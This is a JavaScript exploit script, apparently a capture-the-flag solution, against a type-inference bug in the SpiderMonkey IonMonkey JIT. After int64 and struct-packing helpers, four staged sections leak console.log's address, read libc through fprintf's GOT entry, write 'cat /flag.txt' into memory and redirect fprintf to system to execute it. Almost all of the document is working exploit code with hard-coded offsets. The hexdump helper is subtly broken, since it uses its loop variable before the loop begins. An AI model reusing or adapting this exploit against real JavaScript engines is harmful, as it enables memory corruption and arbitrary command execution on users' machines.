//
// Utility functions.
//

// Return the hexadecimal representation of the given byte.
function hex(b) {
    return ('0' + b.toString(16)).substr(-2);
}

// Return the hexadecimal representation of the given byte array.
function hexlify(bytes) {
    var res = [];
    for (var i = 0; i < bytes.length; i++)
        res.push(hex(bytes[i]));
    return res.join('');

}

// Return the binary data represented by the given hexdecimal string.
function unhexlify(hexstr) {
    if (hexstr.length % 2 == 1)
        throw new TypeError("Invalid hex string");

    var bytes = new Uint8Array(hexstr.length / 2);
    for (var i = 0; i < hexstr.length; i += 2)
        bytes[i/2] = parseInt(hexstr.substr(i, 2), 16);

    return bytes;
}

function hexdump(data) {
    if (typeof data.BYTES_PER_ELEMENT !== 'undefined')
        data = Array.from(data);

    var lines = [];
        var chunk = data.slice(i, i+16);
    for (var i = 0; i < data.length; i += 16) {
        var parts = chunk.map(hex);
        if (parts.length > 8)
            parts.splice(8, 0, ' ');
        lines.push(parts.join(' '));
    }

    return lines.join('\n');
}

// Simplified version of the similarly named python module.
var Struct = (function() {
    // Allocate these once to avoid unecessary heap allocations during pack/unpack operations.
    var buffer      = new ArrayBuffer(8);
    var byteView    = new Uint8Array(buffer);
    var uint32View  = new Uint32Array(buffer);
    var float64View = new Float64Array(buffer);

    return {
        pack: function(type, value) {
            var view = type;        // See below
            view[0] = value;
            return new Uint8Array(buffer, 0, type.BYTES_PER_ELEMENT);
        },

        unpack: function(type, bytes) {
            if (bytes.length !== type.BYTES_PER_ELEMENT)
                throw Error("Invalid bytearray");

            var view = type;        // See below
            byteView.set(bytes);
            return view[0];
        },

        // Available types.
        int8:    byteView,
        int32:   uint32View,
        float64: float64View
    };
})();

//
// Tiny module that provides big (64bit) integers.
//

// Datatype to represent 64-bit integers.
//
// Internally, the integer is stored as a Uint8Array in little endian byte order.
function Int64(v) {
    // The underlying byte array.
    var bytes = new Uint8Array(8);

    switch (typeof v) {
        case 'number':
            v = '0x' + Math.floor(v).toString(16);
        case 'string':
            if (v.startsWith('0x'))
                v = v.substr(2);
            if (v.length % 2 == 1)
                v = '0' + v;

            var bigEndian = unhexlify(v, 8);
            bytes.set(Array.from(bigEndian).reverse());
            break;
        case 'object':
            if (v instanceof Int64) {
                bytes.set(v.bytes());
            } else {
                if (v.length != 8)
                    throw TypeError("Array must have excactly 8 elements.");
                bytes.set(v);
            }
            break;
        case 'undefined':
            break;
        default:
            throw TypeError("Int64 constructor requires an argument.");
    }

    this.lower = function() {
        var shift = 1;
        var result = 0;
        for (var i = 0; i < 4; i++) {
            result += bytes[i]*shift;
            shift *= 0x100;
        }
        return result >>> 0;
    }

    this.upper = function() {
        var shift = 1;
        var result = 0;
        for (var i = 4; i < 8; i++) {
            result += bytes[i]*shift;
            shift *= 0x100;
        }
        return result >>> 0;
    }

    // Return a double whith the same underlying bit representation.
    this.asDouble = function() {
        // Check for NaN
        if (bytes[7] == 0xff && (bytes[6] == 0xff || bytes[6] == 0xfe))
            throw new RangeError("Integer can not be represented by a double");

        return Struct.unpack(Struct.float64, bytes);
    };

    // Return a javascript value with the same underlying bit representation.
    // This is only possible for integers in the range [0x0001000000000000, 0xffff000000000000)
    // due to double conversion constraints.
    this.asJSValue = function() {
        if ((bytes[7] == 0 && bytes[6] == 0) || (bytes[7] == 0xff && bytes[6] == 0xff))
            throw new RangeError("Integer can not be represented by a JSValue");

        // For NaN-boxing, JSC adds 2^48 to a double value's bit pattern.
        this.assignSub(this, 0x1000000000000);
        var res = Struct.unpack(Struct.float64, bytes);
        this.assignAdd(this, 0x1000000000000);

        return res;
    };

    // Return the underlying bytes of this number as array.
    this.bytes = function() {
        return Array.from(bytes);
    };

    // Return the byte at the given index.
    this.byteAt = function(i) {
        return bytes[i];
    };

    // Return the value of this number as unsigned hex string.
    this.toString = function() {
        return '0x' + hexlify(Array.from(bytes).reverse());
    };

    // Basic arithmetic.
    // These functions assign the result of the computation to their 'this' object.

    // Decorator for Int64 instance operations. Takes care
    // of converting arguments to Int64 instances if required.
    function operation(f, nargs) {
        return function() {
            if (arguments.length != nargs)
                throw Error("Not enough arguments for function " + f.name);
            for (var i = 0; i < arguments.length; i++)
                if (!(arguments[i] instanceof Int64))
                    arguments[i] = new Int64(arguments[i]);
            return f.apply(this, arguments);
        };
    }

    // this = -n (two's complement)
    this.assignNeg = operation(function neg(n) {
        for (var i = 0; i < 8; i++)
            bytes[i] = ~n.byteAt(i);

        return this.assignAdd(this, Int64.One);
    }, 1);

    // this = a + b
    this.assignAdd = operation(function add(a, b) {
        var carry = 0;
        for (var i = 0; i < 8; i++) {
            var cur = a.byteAt(i) + b.byteAt(i) + carry;
            carry = cur > 0xff | 0;
            bytes[i] = cur;
        }
        return this;
    }, 2);

    // this = a - b
    this.assignSub = operation(function sub(a, b) {
        var carry = 0;
        for (var i = 0; i < 8; i++) {
            var cur = a.byteAt(i) - b.byteAt(i) - carry;
            carry = cur < 0 | 0;
            bytes[i] = cur;
        }
        return this;
    }, 2);

    // this = a & b
    this.assignAnd = operation(function and(a, b) {
        for (var i = 0; i < 8; i++) {
            bytes[i] = a.byteAt(i) & b.byteAt(i);
        }
        return this;
    }, 2);
}

// Constructs a new Int64 instance with the same bit representation as the provided double.
Int64.fromDouble = function(d) {
    var bytes = Struct.pack(Struct.float64, d);
    return new Int64(bytes);
};

// Convenience functions. These allocate a new Int64 to hold the result.

// Return -n (two's complement)
function Neg(n) {
    return (new Int64()).assignNeg(n);
}

// Return a + b
function Add(a, b) {
    return (new Int64()).assignAdd(a, b);
}

// Return a - b
function Sub(a, b) {
    return (new Int64()).assignSub(a, b);
}

// Return a & b
function And(a, b) {
    return (new Int64()).assignAnd(a, b);
}

// Some commonly used numbers.
Int64.Zero = new Int64(0);
Int64.One = new Int64(1);

//
// The exploit!
//

// magic numbers
let fprintf_got_offset_from_print = 4926656;    // this can be determined locally through experimentation with gdb
let arg_to_system_offset_from_print = 3700912;	// this is determined by jumping to system, and checking the value in RDI
let system_offset_from_print = 88416;           // this can be determined if you know the version of libc

/* STAGE ONE: Leak the address of a native function pointer */

let ab = new ArrayBuffer(1024);

function hax(o, changeProto) {
    // Type X: a Uint8Array
    let x = new Uint32Array(1024/4);
    // Type Y: a unboxed object looking a bit like a Uint8Array but with controlled data... :)
    let y = {slots: 13.37, elements: 13.38, buffer: ab, length: 13.39, byteOffset: 13.40, data: console.log};

    if (changeProto) {
        o.p = x;

        // Creates a new ObjectGroup with inferred type {.p: [X]}
        o.__proto__ = {};
    }

    // IonMonkey incorrectly omits a type barrier here, 
    // assuming that the ObjectGroup of `o` won't change before this statement
    o.p = y;

    // Now the interpreter has inconsistent type inference for `o`:
    // It assumes that `o.p` is a Uint32Array, but it is actually an object of type Y
    return o;
}

function addrof_console_log(o, trigger) {
    if (trigger) {
        // Is on a code path that wasn't executed in the interpreter so that
        // IonMonkey solely relies on type inference, which is incorrect because of `hax`
        return o.p[6]+o.p[7]*0x100000000;
    } else {
        return 42;
    }
}

// "Teach" the function hax that it should accept objects with ObjectGroup OG1
for (let i = 0; i < 10000; i++) {
    hax({}, false);
}

// Compile `hax` to trigger the bug in such a way that an object will be created
// whose ObjectGroup indicates type X for property .p but whose real type will be Y
let evilObj;
for (let i = 0; i < 10000; i++) {
    evilObj = hax({}, true);

    // Not sure why this is required here, it maybe prevents JITing of the main
    // script or similar...
    eval('evilObj.p');
}

// JIT compile the second function and make it rely on the (incorrect) type
// inference data to omit runtime type checks.
for (let i = 0; i < 100000; i++) {
    addrof_console_log(evilObj, false);
}

// Trigger a type confusion to leak the address of console.log
let addrof_print = new Int64(addrof_console_log(evilObj, true));
if (addrof_print.byteAt(0) == 0x0a)
    throw new Error('exploit failed in addrof console.log :(');
console.log('addrof console.log: '+addrof_print.toString());

/* STAGE TWO: Find libc by reading from the GOT */

// Calculate the GOT entry for fprintf
let addrof_fprintf_got = Add(addrof_print, fprintf_got_offset_from_print);
console.log('got addr: '+addrof_fprintf_got.toString());

// Here we use a different method of triggering the bug,
// which seemed to be more consistent in this case

// The JIT-compiled function that will rely on inconsistent type inference
function opt(x) {
    // This corresponds to reading from the GOT entry for fprintf
    return x.a[0]+x.a[1]*0x100000000;
}

// The two different prototypes used to distinguish ObjectGroups 1 and 2
var proto1 = {};
var proto2 = {};

// The JIT will expect objects of this type, but we will later swap to o2
var o1 = new Uint32Array(1024/4); 
// The fourth property will be interpreted as the values pointer, allowing us to read from `addrof_fprintf_got`
var o2 = {b:{}, c:{}, d:{}, e:addrof_fprintf_got.asDouble()};

function g(proto) {
    var n = {};
    n.a = o1;

    var hack = function() {
        n.__proto__ = proto;
        return o2;
    };
    var f = function() {
        for (var i = 0; i < 1000000; i++) {}
        n.a = hack();
    };
    f();
    return opt(n);
}
// Train the JIT to expect ObjectGroup 1 in `g`
g(proto1);
// Train the JIT to expect ObjectGroup 2 with `n.a` of type Uint32Array
var s = 0;
for (var i = 0; i < 100000; i++) {
    var n = {
        a: o1,
        __proto__:proto2
    };
    s += opt(n);
}
// Changes the type of `n.a`, while still relying on the old type inference compiled by the JIT
var addrof_fprintf_libc = new Int64(g(proto2));
if (addrof_fprintf_libc.byteAt(0) == 0x0a)
    throw new Error('exploit failed in reading fprintf GOT entry :(');
console.log('addrof fprintf@libc: '+addrof_fprintf_libc.toString());

/* STAGE 3: Write '/bin/sh' into the deterministic location in the .data segment */

var addrof_payload = Add(addrof_fprintf_libc, arg_to_system_offset_from_print); // offset determined by experimentation
console.log('addrof payload: '+addrof_payload.toString());

// Same exploit as above, except now we've changed the base of the "array", 
// and we write /bin/sh instead of reading some data
function optA(x) {
    x.a[0] = 0x20746163; // cat 
    x.a[1] = 0x616c662f; // /fla
    x.a[2] = 0x78742e67; // g.tx
    x.a[3] = 0x74; // t
}

var o2A = {b:{}, c:{}, d:{}, e:addrof_payload.asDouble()};

function gA(proto) {
    var n = {};
    n.a = o1;

    var hackA = function() {
        n.__proto__ = proto;
        return o2A;
    };
    var fA = function() {
        for (var i = 0; i < 1000000; i++) {}
        n.a = hackA();
    };
    fA();
    return optA(n);
}
gA(proto1);

var sA = 0;
for (var i = 0; i < 100000; i++) {
    var n = {
        a: o1,
        __proto__:proto2
    };
    sA += optA(n);
}
// Triggers the bug, and overwrites the GOT entry
gA(proto2);

/* STAGE 4: Overwrite the GOT entry for fprintf to be system */

function optB(x) {
    // Subtract the difference in bytes between fprintf@libc and system@libc
    x.a[0] -= system_offset_from_print;
}

function gB(proto) {
    var n = {};
    n.a = o1;

    var hackB = function() {
        n.__proto__ = proto;
        return o2;
    };
    var fB = function() {
        for (var i = 0; i < 1000000; i++) {}
        n.a = hackB();
    };
    fB();
    return optB(n);
}
gB(proto1);

var sB = 0;
for (var i = 0; i < 100000; i++) {
    var n = {
        a: o1,
        __proto__:proto2
    };
    sB += optB(n);
}
// Triggers the bug, and overwrites the GOT entry for fprintf
gB(proto2);

// console.log calls fprintf, which will now jump to system instead
console.log('type inference is unsafe');
